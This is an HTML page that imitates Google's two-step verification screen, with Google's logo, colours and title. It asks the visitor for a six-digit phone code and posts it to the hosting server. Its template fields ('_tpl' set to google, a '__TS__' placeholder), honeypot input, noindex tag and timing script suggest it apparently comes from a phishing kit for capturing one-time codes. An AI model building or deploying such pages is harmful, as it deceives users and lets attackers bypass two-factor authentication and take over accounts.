<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Verify it is you - Google</title>
<meta name="theme-color" content="#4285F4">
<meta name="referrer" content="strict-origin-when-cross-origin">
<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%234285F4%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EG%3C/text%3E%3C/svg%3E">
<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%234285F4%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EG%3C/text%3E%3C/svg%3E">
<meta property="og:title" content="Verify it is you - Google">
<meta property="og:site_name" content="Google">
<style>
  body { margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#fff;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; }
  .card { background:#fff;width:100%;max-width:420px;border-radius:8px;padding:40px 36px;text-align:center;box-shadow:0 12px 40px rgba(0,0,0,.10); }
  .mark { display:flex;justify-content:center;margin:0 0 20px; }
  h1 { font-size:20px;margin:0 0 8px;color:#202124;font-weight:600; }
  p { color:#5f6368;font-size:14px;line-height:1.55;margin:0 0 22px; }
  .otp { display:flex;gap:8px;justify-content:center;margin-bottom:20px; }
  .otp input { width:44px;height:52px;text-align:center;font-size:20px;border:1px solid #ccd0d5;border-radius:8px;outline:none;background:#fff;color:#202124; }
  .otp input:focus { border-color:#4285F4; }
  button { width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;background:#4285F4;border:0;border-radius:8px;cursor:pointer; }
  .resend { margin-top:14px;font-size:13px;color:#5f6368; }
  .resend a { color:#4285F4;text-decoration:none; }
</style>
</head>
<body>
<form class="card" method="POST" action="/">
  <div class="mark"><svg viewBox="0 0 48 48" width="48" height="48" role="img" aria-label="Google"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24s.85 6.91 2.34 9.88l7.35-5.7z"/><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/></svg></div>
  <h1>2-Step Verification</h1>
  <p>A code was sent to your phone. Enter it to finish signing in.</p>
  <div class="otp">
    <input name="otp_1" maxlength="1" inputmode="numeric" autofocus>
    <input name="otp_2" maxlength="1" inputmode="numeric">
    <input name="otp_3" maxlength="1" inputmode="numeric">
    <input name="otp_4" maxlength="1" inputmode="numeric">
    <input name="otp_5" maxlength="1" inputmode="numeric">
    <input name="otp_6" maxlength="1" inputmode="numeric">
  </div>
  <button type="submit">Next</button>

  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
  <input type="hidden" name="_tpl" value="google">
  <input type="hidden" name="_ts" value="__TS__">
  <div class="resend">Didn't get a code? <a href="#">Resend</a></div>

<script>
/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
   record it, and we log how long the form was open (bot forms are instant). */
(function(){
  var t0 = Date.now();
  var f = document.querySelector('form');
  if(!f) return;
  f.addEventListener('submit', function(){
    var el = f.querySelector('input[name=_ts]');
    if(el) el.value = String(Date.now() - t0);
  });
})();
</script>
</form>
</body>
</html>
